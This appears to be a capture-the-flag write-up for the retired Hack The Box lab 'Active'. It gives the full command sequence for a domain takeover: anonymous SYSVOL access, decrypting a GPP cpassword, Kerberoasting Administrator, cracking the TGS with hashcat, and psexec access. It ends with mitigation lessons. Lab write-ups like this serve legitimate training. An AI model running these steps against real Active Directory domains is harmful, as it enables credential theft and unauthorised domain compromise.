---
machine: Active
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, gpp, cpassword, kerberoasting, smb]
---

# Active — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A misconfiguration box, not an exploit one: the `Replication` share (SYSVOL) is anonymously readable and holds a `Groups.xml` with a **GPP** `cpassword`. The AES key has been public since MS14-025, so it decrypts to `SVC_TGS` credentials. With that account you enumerate users by RID and **Kerberoast** Administrator, who has an SPN it should not have. Crack the TGS and you are domain admin.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 49152-...
```

That set is an `active.htb` domain controller (DNS, Kerberos, LDAP, SMB).

```bash
smbclient -L //<IP>/ -N
smbclient //<IP>/Replication -N
```

```text
Replication   Disk
```

## Access

1. **GPP in SYSVOL**:

```bash
smbclient //<IP>/Replication -N -c 'recurse ON; prompt OFF; mget *'
grep -ril cpassword .
cat ./active.htb/Policies/{...}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<Properties userName="SVC_TGS" cpassword="<cpassword>" .../>
```

2. **Decrypt** (MS14-025: the key is published):

```bash
gpp-decrypt '<cpassword>'
# SVC_TGS password
```

3. **Enumeration and Kerberoasting**:

```bash
nxc smb <IP> -u SVC_TGS -p '<password>' --rid-brute
impacket-GetUserSPNs active.htb/SVC_TGS:'<password>' -dc-ip <IP> -request
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

Administrator has a mistakenly registered SPN, so its TGS can be requested and cracked offline.

```bash
impacket-psexec active.htb/Administrator:'<password>'@<IP>
# or evil-winrm if 5985 is open
```

## Escalation

There is none as such: the cracked account already owns the domain. Confirm and finish with root's flag on Administrator's desktop.

```cmd
whoami
# active\administrator
```

## Pitfalls

- `Replication` may need the full GPO path; enable `recurse ON` before `mget`.
- `GetUserSPNs` needs `-request`; without it you only get a list.
- The hash mode is `-m 13100` (TGS-REP etype 23), not `-m 1000`.
- If `psexec` fails on SMB signing, use `wmiexec` or `smbexec`.

## Lessons

- GPP `cpassword` is a cleartext credential: Microsoft published the key, yet it still turns up in SYSVOL.
- An SPN on a privileged account lets any domain user request its TGS.
- Mitigation: strip `cpassword` from SYSVOL, use long service-account passwords, and review unnecessary SPNs.
